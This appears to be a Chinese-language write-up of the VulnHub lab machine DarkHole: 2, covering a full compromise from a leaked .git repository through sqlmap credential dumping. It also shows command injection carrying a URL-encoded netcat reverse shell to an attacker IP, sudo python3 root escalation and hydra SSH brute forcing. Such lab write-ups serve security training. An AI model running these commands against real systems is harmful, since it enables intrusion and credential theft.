靶机地址：[DarkHole: 2 ~ VulnHub](https://www.vulnhub.com/entry/darkhole-2,740/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.56"
sudo nmap -p "22,80" -sV "192.168.1.56"
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

访问web页面，可以跳转到一个登录页，查看源码，没发现什么特别的内容
只有如下注释
```html
<!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html"><h1>Sign In</h1></a> -->
<!-- <a href="file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html"> <h1>Log In</h1></a> -->
```
先进行路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.56"
# /.git/
# /.idea/
# /config/
# /dashboard.php
```
可以发现git源码泄露，下载 `.git` 目录（不好用的话可以搜其它工具，如 [GitHacker](https://github.com/WangYihang/GitHacker) ）
```Shell
# 下载.git目录
bash /home/kali/Tools/GitTools/Dumper/gitdumper.sh "http://192.168.1.56/.git/" dump_git
```
git提交记录如下
```
commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300

    i changed login.php file for more secure

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300

    I added login.php file with default credentials

commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:02:44 2021 +0300

    First Initialize
```
解压每一次提交
```Shell
bash /home/kali/Tools/GitTools/Extractor/extractor.sh dump_git extract_git
```
查看第二次提交的内容
```Shell
git diff a4d900a8d85e8938d3601f3cef113ee293028e10
# 或
cat extract_git/1-a4d900a8d85e8938d3601f3cef113ee293028e10/login.php
```
包含如下内容
```php
if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
    $_SESSION['userid'] = 1;
    header("location:dashboard.php");
    die();
}
```
可以试试这个账号密码登录，登录成功了，跳转到了 `/dashboard.php?id=1`
尝试SQL注入 `/dashboard.php?id=1'+or+1=1--+`
```Shell
sqlmap -r req.txt -p "id"
sqlmap -r req.txt -p "id" --dbs
# darkhole_2
sqlmap -r req.txt -p "id" -D "darkhole_2" --tables
# ssh users
sqlmap -r req.txt -p "id" -D "darkhole_2" -T "ssh" --columns
# user id pass
sqlmap -r req.txt -p "id" -D "darkhole_2" -T "ssh" -C "id,user,pass" --dump
# 1 jehad fool
```
直接SSH，成功了，信息收集
```Shell
cat /etc/passwd | grep /bin/bash
# root:x:0:0:root:/root:/bin/bash
# lama:x:1000:1000:darkhole:/home/lama:/bin/bash
# jehad:x:1001:1001:,,,:/home/jehad:/bin/bash
# losy:x:1002:1002:,,,:/home/losy:/bin/bash
uname -a
# Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
ss -antlp
# 22 80 53 3306 9999 33060
cat .bash_history
# curl "http://localhost:9999/?cmd=id"
curl "http://localhost:9999/?cmd=whoami"
# losy
```
这样的话尝试切换到losy用户
```Shell
nc -e
# nc: invalid option -- 'e'
# 试试分号能不能用
curl "http://localhost:9999/?cmd=id;whoami"
# 可以用
# 试试管道能不能用
curl "http://localhost:9999/?cmd=cat%20/etc/passwd%20|%20grep%20/bin/bash"
# 可以用
# 反弹shell 先对特殊字符进行URL编码
curl "http://localhost:9999/?cmd=rm%20%2Ftmp%2Ff%3B%20mkfifo%20%2Ftmp%2Ff%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20%2Di%202%3E%261%20%7C%20nc%20192%2E168%2E1%2E26%204444%20%3E%20%2Ftmp%2Ff"
```
成功获取到了反弹shell
```Shell
cat .bash_history
# sudo -l
# password:gang
# sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
sudo -l
# gang
# (root) /usr/bin/python3
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
提权成功

其它提权方式，还记得之前收集到的用户还有一个 `lama` 没有利用到，尝试对其进行SSH暴力破解
```Shell
hydra -l lama -P /home/kali/Tools/Custom/MidPwds.txt ssh://192.168.1.56
# [22][ssh] host: 192.168.1.56   login: lama   password: 123
```
登录 `lama` 用户
```Shell
ssh lama@192.168.1.56
ls -a
# .sudo_as_admin_successful
sudo -l
# (ALL : ALL) ALL
sudo su
```
提权成功